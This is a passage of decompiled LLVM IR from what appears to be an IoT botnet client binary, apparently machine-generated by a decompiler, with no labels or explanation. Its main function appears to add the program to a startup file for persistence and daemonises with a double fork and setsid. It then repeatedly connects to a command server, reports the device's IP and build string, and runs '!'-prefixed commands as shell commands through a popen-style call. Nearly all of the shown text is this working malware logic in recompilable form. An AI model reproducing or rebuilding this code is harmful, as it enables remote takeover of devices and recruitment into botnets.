  ret i32 %v3_e510

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_e3d4, { 1, 0 }
  uselistorder i32 %v2_e420, { 1, 4, 0, 3, 2 }
  uselistorder i32 %v0_e26c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 3, 5, 2, 0, 1, 4 }
  uselistorder i32 (i32)* @htons, { 10, 9, 8, 7, 6, 5, 4, 11, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e50c, { 1, 0 }
  uselistorder label %dec_label_pc_e4fc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e4b0, { 1, 0 }
  uselistorder label %dec_label_pc_e418, { 1, 0 }
  uselistorder label %dec_label_pc_e3d0, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([10 x i8]* @global_var_18be4.258 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e550 = load i32, i32* @r4, align 4
  store i32 %v3_e550, i32* %stack_var_-24, align 4
  store i32 58712, i32* %stack_var_-4, align 4
  %v19_e550 = ptrtoint i32* %stack_var_-24 to i32
  %v2_e554 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e554, i32* @fp, align 4
  %v1_e598 = bitcast i8** %argv to i32*
  %v2_e598 = load i32, i32* %v1_e598, align 4
  store i32 %v2_e598, i32* @r4, align 4
  %v2_e5b0 = load i32, i32* %v1_e598, align 4
  %v1_e5b4 = inttoptr i32 %v2_e5b0 to i8*
  %v3_e5b8 = call i32 @strlen(i8* %v1_e5b4)
  %v0_e5c0 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_18bf0.260 to i32), i32* @r1, align 4
  %v3_e5cc = call i32 @strncpy(i32 %v0_e5c0, i32 ptrtoint (i32* @global_var_18bf0.260 to i32), i32 %v3_e5b8)
  store i32 ptrtoint (i32* @global_var_18bf0.260 to i32), i32* %v1_e598, align 4
  %v0_e608 = call i32 @prctl()
  %v2_e610 = call i32 @__GI_time(i32* null)
  store i32 %v2_e610, i32* @r4, align 4
  %v0_e618 = call i32 @__libc_getpid()
  %v0_e620 = load i32, i32* @r4, align 4
  %v2_e620 = xor i32 %v0_e620, %v0_e618
  %v1_e628 = call i32 @srand(i32 %v2_e620)
  %v2_e630 = call i32 @__GI_time(i32* null)
  store i32 %v2_e630, i32* @r4, align 4
  %v0_e638 = call i32 @__libc_getpid()
  %v0_e640 = load i32, i32* @r4, align 4
  %v2_e640 = xor i32 %v0_e640, %v0_e638
  %v1_e648 = call i32 @init_rand(i32 %v2_e640)
  store i32 ptrtoint ([19 x i8]* @global_var_18bf4.262 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_18c08.264 to i32), i32* @r1, align 4
  %v3_e664 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_18bf4.262 to i32), i32 ptrtoint ([2 x i8]* @global_var_18c08.264 to i32))
  %v2_e674 = icmp eq i32 %v3_e664, 0
  br i1 %v2_e674, label %dec_label_pc_e67c, label %dec_label_pc_e698

dec_label_pc_e67c:                                ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_18c0c.266 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_18c08.264 to i32), i32* @r1, align 4
  %v3_e68c = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_18c0c.266 to i32), i32 ptrtoint ([2 x i8]* @global_var_18c08.264 to i32))
  br label %dec_label_pc_e698

dec_label_pc_e698:                                ; preds = %entry, %dec_label_pc_e67c
  %stack_var_-88.0 = phi i32 [ %v3_e68c, %dec_label_pc_e67c ], [ %v3_e664, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_18c0c.266, i32 0, i32 0), %dec_label_pc_e67c ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_18bf4.262, i32 0, i32 0), %entry ]
  %v2_e69c = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_e69c, label %dec_label_pc_e834, label %dec_label_pc_e6a4

dec_label_pc_e6a4:                                ; preds = %dec_label_pc_e698
  %v2_e6b4 = load i32, i32* %v1_e598, align 4
  %v1_e6b8 = inttoptr i32 %v2_e6b4 to i8*
  %v3_e6bc = call i32 @strlen(i8* %v1_e6b8)
  %v2_e6d0 = ptrtoint i32* %stack_var_-368 to i32
  %v2_e6dc = call i32 @getcwd(i32 %v2_e6d0, i32 256)
  store i32 ptrtoint (i32* @global_var_18c1c.268 to i32), i32* @r1, align 4
  %v2_e6ec = bitcast i32* %stack_var_-368 to i8*
  %v3_e6ec = call i32 @__GI_strcoll(i8* %v2_e6ec, i32 ptrtoint (i32* @global_var_18c1c.268 to i32))
  %v2_e6f4 = icmp eq i32 %v3_e6ec, 0
  br i1 %v2_e6f4, label %dec_label_pc_e82c, label %dec_label_pc_e70c

dec_label_pc_e700:                                ; preds = %dec_label_pc_e70c
  %v1_e704 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_e70c

dec_label_pc_e70c:                                ; preds = %dec_label_pc_e6a4, %dec_label_pc_e700
  %stack_var_-84.0 = phi i32 [ %v1_e704, %dec_label_pc_e700 ], [ %v3_e6bc, %dec_label_pc_e6a4 ]
  %v2_e71c = load i32, i32* %v1_e598, align 4
  %v2_e724 = add i32 %v2_e71c, %stack_var_-84.0
  %v1_e728 = inttoptr i32 %v2_e724 to i8*
  %v2_e728 = load i8, i8* %v1_e728, align 1
  %v7_e72c = icmp eq i8 %v2_e728, 47
  br i1 %v7_e72c, label %dec_label_pc_e734, label %dec_label_pc_e700

dec_label_pc_e734:                                ; preds = %dec_label_pc_e70c
  %v2_e744 = load i32, i32* %v1_e598, align 4
  %v2_e74c = add i32 %v2_e744, %stack_var_-84.0
  %v2_e750 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_e750, i32* @r0, align 4
  %v7_e764 = call i32 @sprintf(i32 %v2_e750, i32 ptrtoint ([8 x i8]* @global_var_18c20.270 to i32), i32 %v2_e6d0, i32 %v2_e74c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_e7c0 = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_e774 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_e7a0 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_e7bc.outer

dec_label_pc_e76c:                                ; preds = %dec_label_pc_e7bc
  %v3_e784 = call i32 @fgets(i32 %v2_e774, i32 1024, i32 %stack_var_-88.0)
  %v3_e7a0 = call i32 @__GI_strcasecmp(i8* %v2_e7a0, i32 %v2_e750)
  %v2_e7a8 = icmp eq i32 %v3_e7a0, 0
  br i1 %v2_e7a8, label %dec_label_pc_e7b0, label %dec_label_pc_e7bc

dec_label_pc_e7b0:                                ; preds = %dec_label_pc_e76c
  %v1_e7b4 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_e7bc.outer

dec_label_pc_e7bc.outer:                          ; preds = %dec_label_pc_e7b0, %dec_label_pc_e734
  %stack_var_-80.0.ph = phi i32 [ %v1_e7b4, %dec_label_pc_e7b0 ], [ 0, %dec_label_pc_e734 ]
  br label %dec_label_pc_e7bc

dec_label_pc_e7bc:                                ; preds = %dec_label_pc_e7bc.outer, %dec_label_pc_e76c
  %v2_e7c0 = call i32 @feof(i8* %v1_e7c0)
  %v2_e7c8 = icmp eq i32 %v2_e7c0, 0
  br i1 %v2_e7c8, label %dec_label_pc_e76c, label %dec_label_pc_e7d0

dec_label_pc_e7d0:                                ; preds = %dec_label_pc_e7bc
  %v2_e7d4 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_e7e0 = call i32 @__GI_fclose(i8* %v1_e7c0)
  br i1 %v2_e7d4, label %dec_label_pc_e7dc, label %dec_label_pc_e834

dec_label_pc_e7dc:                                ; preds = %dec_label_pc_e7d0
  %v4_e7e4 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_e7e4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18c28.272 to i32), i32* @r1, align 4
  %v3_e7ec = call i32 @__GI_fopen(i32 %v4_e7e4, i32 ptrtoint (i32* @global_var_18c28.272 to i32))
  %v2_e7fc = icmp eq i32 %v3_e7ec, 0
  br i1 %v2_e7fc, label %dec_label_pc_e834, label %dec_label_pc_e804

dec_label_pc_e804:                                ; preds = %dec_label_pc_e7dc
  %v2_e810 = call i32 @__GI_fputs(i32 %v2_e750, i32 %v3_e7ec)
  %v1_e818 = inttoptr i32 %v3_e7ec to i8*
  %v2_e818 = call i32 @__GI_fclose(i8* %v1_e818)
  br label %dec_label_pc_e834

dec_label_pc_e82c:                                ; preds = %dec_label_pc_e6a4
  %v1_e830 = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_e830 = call i32 @__GI_fclose(i8* %v1_e830)
  br label %dec_label_pc_e834

dec_label_pc_e834:                                ; preds = %dec_label_pc_e7d0, %dec_label_pc_e7dc, %dec_label_pc_e698, %dec_label_pc_e804, %dec_label_pc_e82c
  %v0_e834 = call i32 @getOurIP()
  %v0_e838 = call i32 @__libc_fork()
  %v2_e848 = icmp eq i32 %v0_e838, 0
  br i1 %v2_e848, label %dec_label_pc_e878, label %dec_label_pc_e8b4

dec_label_pc_e878:                                ; preds = %dec_label_pc_e834
  %v0_e878 = call i32 @__libc_fork()
  %v2_e888 = icmp eq i32 %v0_e878, 0
  br i1 %v2_e888, label %dec_label_pc_e898.thread, label %dec_label_pc_e8a4

dec_label_pc_e898.thread:                         ; preds = %dec_label_pc_e878
  br label %dec_label_pc_e8c0

dec_label_pc_e8a4:                                ; preds = %dec_label_pc_e878
  %v1_e894 = call i32 @__GI_exit(i32 0)
  %v2_e8ac = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_18c2c.274 to i32))
  br label %dec_label_pc_e8c0

dec_label_pc_e8b4:                                ; preds = %dec_label_pc_e834
  %v2_e850 = ptrtoint i32* %stack_var_-112 to i32
  %v3_e860 = call i32 @__libc_waitpid(i32 %v0_e838, i32 %v2_e850, i32 0)
  %v1_e868 = call i32 @__GI_exit(i32 0)
  %v2_e8bc = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_18c2c.274 to i32))
  br label %dec_label_pc_e8c0

dec_label_pc_e8c0:                                ; preds = %dec_label_pc_e898.thread, %dec_label_pc_e8a4, %dec_label_pc_e8b4
  %v0_e8c0 = call i32 @__GI_setsid()
  %v0_e8c8 = call i32 @chdir()
  %v2_e8d4 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_f13c = ptrtoint i32* %stack_var_-5744 to i32
  %v4_f14c = bitcast i32* %stack_var_-5744 to i8*
  %v2_ec20 = add i32 %v19_e550, -5720
  %v2_eec8 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_eed8 = bitcast i32* %stack_var_-1648 to i8*
  %v1_ed4c = or i32 %v2_f13c, 1
  %v5_ed50 = inttoptr i32 %v1_ed4c to i8*
  %v2_ed6c = or i32 %v2_f13c, 2
  %v2_f008 = add i32 %v19_e550, -600
  br label %dec_label_pc_e8dc.outer

dec_label_pc_e8dc.outer:                          ; preds = %dec_label_pc_eca4, %dec_label_pc_f12c, %dec_label_pc_e8c0
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_e8c0 ], [ %stack_var_-96.2.ph, %dec_label_pc_f12c ], [ %v1_eca8, %dec_label_pc_eca4 ]
  %v0_e8dc24 = call i32 @initConnection()
  %v2_e8e426 = icmp eq i32 %v0_e8dc24, 0
  br i1 %v2_e8e426, label %dec_label_pc_e8f8, label %dec_label_pc_e8ec

dec_label_pc_e8ec:                                ; preds = %dec_label_pc_e8dc.outer, %dec_label_pc_e8ec
  %v1_e8f0 = call i32 @sleep(i32 30)
  %v0_e8dc = call i32 @initConnection()
  %v2_e8e4 = icmp eq i32 %v0_e8dc, 0
  br i1 %v2_e8e4, label %dec_label_pc_e8f8, label %dec_label_pc_e8ec

dec_label_pc_e8f8:                                ; preds = %dec_label_pc_e8ec, %dec_label_pc_e8dc.outer
  %v2_e8fc = load i32, i32* @global_var_22864.48, align 4
  store i32 %v2_e8fc, i32* @r5, align 4
  %v2_e904 = load i32, i32* @global_var_28ae4.79, align 4
  store i32 %v2_e904, i32* @r0, align 4
  %v1_e908 = call i32 @__GI_inet_ntoa(i32 %v2_e904)
  store i32 %v1_e908, i32* @r4, align 4
  %v0_e910 = call i32 @getBuild()
  %v0_e918 = load i32, i32* @r5, align 4
  %v0_e920 = load i32, i32* @r4, align 4
  %v4_e924 = call i32 @Rootsprintf(i32 %v0_e918, i32 ptrtoint (i32* @global_var_18c3c.278 to i32), i32 %v0_e920, i32 %v0_e910)
  br label %dec_label_pc_f12c.outer

dec_label_pc_e948:                                ; preds = %dec_label_pc_ebf8, %dec_label_pc_eba4
  %v3_e94c = mul i32 %v3_ebec, 4
  %v2_e958 = load i32, i32* @global_var_28af0.67, align 4
  %v2_e95c = add i32 %v2_e958, %v3_e94c
  %v1_e960 = inttoptr i32 %v2_e95c to i32*
  %v2_e960 = load i32, i32* %v1_e960, align 4
  %v3_e970 = call i32 @__libc_waitpid(i32 %v2_e960, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_e970, 1
  br i1 %tmp111, label %dec_label_pc_eb98, label %dec_label_pc_e9d8

dec_label_pc_e990:                                ; preds = %dec_label_pc_ea34, %dec_label_pc_e9d8
  %v3_e994 = mul i32 %v1_e984, 4
  %v2_e9a0 = load i32, i32* @global_var_28af0.67, align 4
  %v2_e9a4 = add i32 %v2_e9a0, %v3_e994
  %v1_e9a8 = add i32 %v2_e9a4, -4
  %v1_e9c4 = inttoptr i32 %v2_e9a4 to i32*
  %v2_e9c4 = load i32, i32* %v1_e9c4, align 4
  %v2_e9c8 = inttoptr i32 %v1_e9a8 to i32*
  store i32 %v2_e9c4, i32* %v2_e9c8, align 4
  br label %dec_label_pc_e9d8

dec_label_pc_e9d8:                                ; preds = %dec_label_pc_e948, %dec_label_pc_e990
  %v3_e980.sink = phi i32 [ %v1_e984, %dec_label_pc_e990 ], [ %v3_ebec, %dec_label_pc_e948 ]
  %v1_e984 = add i32 %v3_e980.sink, 1
  %v2_e9f4 = load i32, i32* @global_var_2286c.64, align 4
  %v5_e9f4 = load i32, i32* @global_var_22870.65, align 4
  %tmp112 = icmp ugt i32 %v5_e9f4, %v1_e984
  br i1 %tmp112, label %dec_label_pc_e990, label %dec_label_pc_ea1c

dec_label_pc_ea1c:                                ; preds = %dec_label_pc_e9d8
  %v9_ea2c = icmp eq i32 %v5_e9f4, %v1_e984
  br i1 %v9_ea2c, label %dec_label_pc_ea34, label %dec_label_pc_ea4c

dec_label_pc_ea34:                                ; preds = %dec_label_pc_ea1c
  %v9_ea44 = icmp eq i32 %v2_e9f4, 0
  br i1 %v9_ea44, label %dec_label_pc_ea4c, label %dec_label_pc_e990

dec_label_pc_ea4c:                                ; preds = %dec_label_pc_ea34, %dec_label_pc_ea1c
  %v3_ea50 = mul i32 %v1_e984, 4
  %v2_ea5c = load i32, i32* @global_var_28af0.67, align 4
  %v2_ea60 = add i32 %v3_ea50, -4
  %v1_ea64 = add i32 %v2_ea60, %v2_ea5c
  %v2_ea6c = inttoptr i32 %v1_ea64 to i32*
  store i32 0, i32* %v2_ea6c, align 4
  %v2_ea74 = load i32, i32* @global_var_2286c.64, align 4
  %v5_ea74 = load i32, i32* @global_var_22870.65, align 4
  %v2_ea80 = add i32 %v2_ea74, -1
  %v3_ea80 = icmp ne i32 %v2_ea74, 0
  %v3_ea84 = add i32 %v5_ea74, -1
  %v4_ea84 = zext i1 %v3_ea80 to i32
  %v5_ea84 = add i32 %v3_ea84, %v4_ea84
  store i32 %v2_ea80, i32* @global_var_2286c.64, align 4
  store i32 %v5_ea84, i32* @global_var_22870.65, align 4
  %v3_ea98 = udiv i32 %v2_ea80, 1073741824
  %v3_ea9c = mul i32 %v5_ea84, 4
  %v2_eaa0 = or i32 %v3_ea9c, %v3_ea98
  store i32 %v2_eaa0, i32* @r4, align 4
  %v3_eaa4 = mul i32 %v2_ea80, 4
  %v1_eaa8 = add i32 %v3_eaa4, 4
  %v1_eab0 = call i32 @malloc(i32 %v1_eaa8)
  br label %dec_label_pc_eb08

dec_label_pc_eac8:                                ; preds = %dec_label_pc_eb64, %dec_label_pc_eb08
  %v3_eacc = mul i32 %v3_eb58, 4
  %v2_ead8 = add i32 %v3_eacc, %v1_eab0
  %v2_eaec = load i32, i32* @global_var_28af0.67, align 4
  %v2_eaf0 = add i32 %v2_eaec, %v3_eacc
  %v1_eaf4 = inttoptr i32 %v2_eaf0 to i32*
  %v2_eaf4 = load i32, i32* %v1_eaf4, align 4
  %v2_eaf8 = inttoptr i32 %v2_ead8 to i32*
  store i32 %v2_eaf4, i32* %v2_eaf8, align 4
  %v1_eb00 = add i32 %v3_eb58, 1
  br label %dec_label_pc_eb08

dec_label_pc_eb08:                                ; preds = %dec_label_pc_ea4c, %dec_label_pc_eac8
  %v3_eb58 = phi i32 [ 0, %dec_label_pc_ea4c ], [ %v1_eb00, %dec_label_pc_eac8 ]
  %v2_eb24 = load i32, i32* @global_var_2286c.64, align 4
  %v5_eb24 = load i32, i32* @global_var_22870.65, align 4
  %tmp113 = icmp ugt i32 %v5_eb24, %v3_eb58
  br i1 %tmp113, label %dec_label_pc_eac8, label %dec_label_pc_eb4c

dec_label_pc_eb4c:                                ; preds = %dec_label_pc_eb08
  %v9_eb5c = icmp eq i32 %v5_eb24, %v3_eb58
  br i1 %v9_eb5c, label %dec_label_pc_eb64, label %dec_label_pc_eb7c

dec_label_pc_eb64:                                ; preds = %dec_label_pc_eb4c
  %v9_eb74 = icmp eq i32 %v2_eb24, 0
  br i1 %v9_eb74, label %dec_label_pc_eb7c, label %dec_label_pc_eac8

dec_label_pc_eb7c:                                ; preds = %dec_label_pc_eb64, %dec_label_pc_eb4c
  %v2_eb80 = load i32, i32* @global_var_28af0.67, align 4
  store i32 %v2_eb80, i32* @r0, align 4
  %v0_eb88 = call i32 @free()
  store i32 %v1_eab0, i32* @global_var_28af0.67, align 4
  br label %dec_label_pc_eb98

dec_label_pc_eb98:                                ; preds = %dec_label_pc_e948, %dec_label_pc_eb7c
  %v1_eb9c = add i32 %v3_ebec, 1
  br label %dec_label_pc_eba4

dec_label_pc_eba4:                                ; preds = %dec_label_pc_f12c, %dec_label_pc_eb98
  %v3_ebec = phi i32 [ %v1_eb9c, %dec_label_pc_eb98 ], [ 0, %dec_label_pc_f12c ]
  %v3_ebac = ashr i32 %v3_ebec, 31
  %v2_ebbc = load i32, i32* @global_var_2286c.64, align 4
  %v5_ebbc = load i32, i32* @global_var_22870.65, align 4
  %v3_ebd8 = icmp uge i32 %v5_ebbc, %v3_ebec
  %v9_ebd8 = icmp eq i32 %v5_ebbc, %v3_ebec
  %v2_ebdc = xor i1 %v9_ebd8, true
  %v3_ebdc = and i1 %v3_ebd8, %v2_ebdc
  br i1 %v3_ebdc, label %dec_label_pc_e948, label %dec_label_pc_ebe0

dec_label_pc_ebe0:                                ; preds = %dec_label_pc_eba4
  br i1 %v9_ebd8, label %dec_label_pc_ebf8, label %dec_label_pc_ec10

dec_label_pc_ebf8:                                ; preds = %dec_label_pc_ebe0
  %tmp = icmp ugt i32 %v2_ebbc, %v3_ebac
  br i1 %tmp, label %dec_label_pc_e948, label %dec_label_pc_ec10

dec_label_pc_ec10:                                ; preds = %dec_label_pc_ebe0, %dec_label_pc_ebf8
  %v2_ec24 = add i32 %v2_ec20, %v5_f14c
  %v3_ec24 = inttoptr i32 %v2_ec24 to i8*
  store i8 0, i8* %v3_ec24, align 1
  %v2_ec40 = call i32 @trim(i8* %v4_f14c)
  %v9_ec58 = call i32 @strstr(i32 %v2_f13c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18b64.218, i32 0, i32 0), i32 %v2_ec24, i32 %v2_f13c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v9_ec6c = icmp eq i32 %v9_ec58, %v2_f13c
  br i1 %v9_ec6c, label %dec_label_pc_f12c, label %dec_label_pc_ec74

dec_label_pc_ec74:                                ; preds = %dec_label_pc_ec10
  %v8_ec88 = call i32 @strstr(i32 %v2_f13c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18ca4.283, i32 0, i32 0), i32 %v9_ec58, i32 %v2_f13c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v9_ec9c = icmp eq i32 %v8_ec88, %v2_f13c
  br i1 %v9_ec9c, label %dec_label_pc_eca4, label %dec_label_pc_ecd0

dec_label_pc_eca4:                                ; preds = %dec_label_pc_ec74
  %v1_eca8 = add i32 %stack_var_-96.2.ph, 1
  %v2_ecb8 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_18cb0.285 to i32))
  %v7_ecc4 = icmp slt i32 %v1_eca8, 21
  br i1 %v7_ecc4, label %dec_label_pc_e8dc.outer, label %dec_label_pc_ecc8

dec_label_pc_ecc8:                                ; preds = %dec_label_pc_eca4
  %v1_eccc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_ecd0

dec_label_pc_ecd0:                                ; preds = %dec_label_pc_ec74, %dec_label_pc_ecc8
  %stack_var_-96.1 = phi i32 [ %v1_eca8, %dec_label_pc_ecc8 ], [ %stack_var_-96.2.ph, %dec_label_pc_ec74 ]
  %v2_ece4 = load i8, i8* %v4_f14c, align 4
  %v7_ece8 = icmp eq i8 %v2_ece4, 33
  br i1 %v7_ece8, label %dec_label_pc_ed0c, label %dec_label_pc_f12c.outer

dec_label_pc_ed0c:                                ; preds = %dec_label_pc_ecd0, %dec_label_pc_ed1c
  %v3_ecf0.sink = phi i8* [ %storemerge8, %dec_label_pc_ed1c ], [ %v4_f14c, %dec_label_pc_ecd0 ]
  %v4_ecf0 = ptrtoint i8* %v3_ecf0.sink to i32
  %v1_ecf4 = add i32 %v4_ecf0, 1
  %storemerge8 = inttoptr i32 %v1_ecf4 to i8*
  %v2_ed10 = load i8, i8* %storemerge8, align 1
  %v7_ed14 = icmp eq i8 %v2_ed10, 32
  br i1 %v7_ed14, label %dec_label_pc_ed2c, label %dec_label_pc_ed1c

dec_label_pc_ed1c:                                ; preds = %dec_label_pc_ed0c
  %v2_ed20 = load i8, i8* %storemerge8, align 1
  %v2_ed24 = icmp eq i8 %v2_ed20, 0
  br i1 %v2_ed24, label %dec_label_pc_ed2c, label %dec_label_pc_ed0c

dec_label_pc_ed2c:                                ; preds = %dec_label_pc_ed1c, %dec_label_pc_ed0c
  %v2_ed30 = load i8, i8* %storemerge8, align 1
  %v2_ed34 = icmp eq i8 %v2_ed30, 0
  br i1 %v2_ed34, label %dec_label_pc_f12c.outer, label %dec_label_pc_ed3c

dec_label_pc_ed3c:                                ; preds = %dec_label_pc_ed2c
  store i8 0, i8* %storemerge8, align 1
  %v3_ed5c = call i32 @strlen(i8* %v5_ed50)
  %v1_ed70 = add i32 %v3_ed5c, %v2_ed6c
  %v5_ed74 = inttoptr i32 %v1_ed70 to i8*
  %v2_edbc = add i32 %v1_ed70, -1
  br label %dec_label_pc_eda4

dec_label_pc_ed7c:                                ; preds = %dec_label_pc_edd0, %dec_label_pc_eda4
  %v3_ed84 = call i32 @strlen(i8* %v5_ed74)
  %v1_ed98 = add i32 %v2_edbc, %v3_ed84
  %v3_eda0 = inttoptr i32 %v1_ed98 to i8*
  store i8 0, i8* %v3_eda0, align 1
  br label %dec_label_pc_eda4

dec_label_pc_eda4:                                ; preds = %dec_label_pc_ed3c, %dec_label_pc_ed7c
  %v3_edac = call i32 @strlen(i8* %v5_ed74)
  %v1_edc0 = add i32 %v3_edac, %v2_edbc
  %v1_edc4 = inttoptr i32 %v1_edc0 to i8*
  %v2_edc4 = load i8, i8* %v1_edc4, align 1
  %v7_edc8 = icmp eq i8 %v2_edc4, 10
  br i1 %v7_edc8, label %dec_label_pc_ed7c, label %dec_label_pc_edd0

dec_label_pc_edd0:                                ; preds = %dec_label_pc_eda4
  %v3_edd8 = call i32 @strlen(i8* %v5_ed74)
  %v1_edec = add i32 %v3_edd8, %v2_edbc
  %v1_edf0 = inttoptr i32 %v1_edec to i8*
  %v2_edf0 = load i8, i8* %v1_edf0, align 1
  %v7_edf4 = icmp eq i8 %v2_edf0, 13
  br i1 %v7_edf4, label %dec_label_pc_ed7c, label %dec_label_pc_edfc

dec_label_pc_edfc:                                ; preds = %dec_label_pc_edd0
  %v2_ee1828 = load i8, i8* %v5_ed74, align 1
  %v7_ee1c32 = icmp eq i8 %v2_ee1828, 32
  br i1 %v7_ee1c32, label %dec_label_pc_ee34, label %dec_label_pc_ee24

dec_label_pc_ee08:                                ; preds = %dec_label_pc_ee24
  %v1_ee0c = add i32 %v4_ee1434, 1
  %v5_ee10 = inttoptr i32 %v1_ee0c to i8*
  %v2_ee18 = load i8, i8* %v5_ee10, align 1
  %v7_ee1c = icmp eq i8 %v2_ee18, 32
  br i1 %v7_ee1c, label %dec_label_pc_ee34, label %dec_label_pc_ee24

dec_label_pc_ee24:                                ; preds = %dec_label_pc_edfc, %dec_label_pc_ee08
  %v4_ee1434 = phi i32 [ %v1_ee0c, %dec_label_pc_ee08 ], [ %v1_ed70, %dec_label_pc_edfc ]
  %stack_var_-64.033 = phi i8* [ %v5_ee10, %dec_label_pc_ee08 ], [ %v5_ed74, %dec_label_pc_edfc ]
  %v2_ee28 = load i8, i8* %stack_var_-64.033, align 1
  %v2_ee2c = icmp eq i8 %v2_ee28, 0
  br i1 %v2_ee2c, label %dec_label_pc_ee34, label %dec_label_pc_ee08

dec_label_pc_ee34:                                ; preds = %dec_label_pc_ee08, %dec_label_pc_ee24, %dec_label_pc_edfc
  %stack_var_-64.0.lcssa = phi i8* [ %v5_ed74, %dec_label_pc_edfc ], [ %v5_ee10, %dec_label_pc_ee08 ], [ %stack_var_-64.033, %dec_label_pc_ee24 ]
  %v4_ee14.lcssa = phi i32 [ %v1_ed70, %dec_label_pc_edfc ], [ %v1_ee0c, %dec_label_pc_ee08 ], [ %v4_ee1434, %dec_label_pc_ee24 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_ee44 = add i32 %v4_ee14.lcssa, 1
  %v2_ee8839 = load i8, i8* %v5_ed74, align 1
  %v2_ee8c41 = icmp eq i8 %v2_ee8839, 0
  br i1 %v2_ee8c41, label %dec_label_pc_ee94, label %dec_label_pc_ee58

dec_label_pc_ee58:                                ; preds = %dec_label_pc_ee34, %dec_label_pc_ee58
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_ee58 ], [ %v5_ed74, %dec_label_pc_ee34 ]
  %storemerge1442 = phi i32 [ %v1_ee7c, %dec_label_pc_ee58 ], [ %v1_ed70, %dec_label_pc_ee34 ]
  %v2_ee5c = load i8, i8* %storemerge743, align 1
  %v3_ee5c = zext i8 %v2_ee5c to i32
  %v1_ee64 = call i32 @__GI_toupper(i32 %v3_ee5c)
  %v1_ee74 = trunc i32 %v1_ee64 to i8
  store i8 %v1_ee74, i8* %storemerge743, align 1
  %v1_ee7c = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_ee7c to i8*
  %v2_ee88 = load i8, i8* %storemerge7, align 1
  %v2_ee8c = icmp eq i8 %v2_ee88, 0
  br i1 %v2_ee8c, label %dec_label_pc_ee94, label %dec_label_pc_ee58

dec_label_pc_ee94:                                ; preds = %dec_label_pc_ee58, %dec_label_pc_ee34
  store i32 ptrtoint ([11 x i8]* @global_var_18cc4.287 to i32), i32* @r1, align 4
  %v4_eea0 = call i32 @__GI_strcoll(i8* %v5_ed74, i32 ptrtoint ([11 x i8]* @global_var_18cc4.287 to i32))
  %v2_eea8 = icmp eq i32 %v4_eea0, 0
  br i1 %v2_eea8, label %dec_label_pc_eeb0, label %dec_label_pc_ef94

dec_label_pc_eeb0:                                ; preds = %dec_label_pc_ee94
  %v0_eeb0 = call i32 @listFork()
  %v2_eeb8 = icmp eq i32 %v0_eeb0, 0
  br i1 %v2_eeb8, label %dec_label_pc_eec0, label %dec_label_pc_f12c.outer

dec_label_pc_eec0:                                ; preds = %dec_label_pc_eeb0
  store i32 1024, i32* @r2, align 4
  %v3_eed8 = call i32 @__GI_memset(i8* %v2_eed8, i32 0)
  %v11_eef8 = call i32 @szprintf(i32 %v2_eec8, i32 ptrtoint ([8 x i8]* @global_var_18cd0.289 to i32), i32 %v1_ee44, i32 %v2_eec8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v3_ef14 = call i32 @fdpopen(i32 %v2_eec8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_18c08.264, i32 0, i32 0))
  br label %dec_label_pc_ef5c

dec_label_pc_ef24:                                ; preds = %dec_label_pc_ef5c
  %v2_ef34 = call i32 @trim(i8* %v2_eed8)
  store i32 1024, i32* @r2, align 4
  %v3_ef50 = call i32 @__GI_memset(i8* %v2_eed8, i32 0)
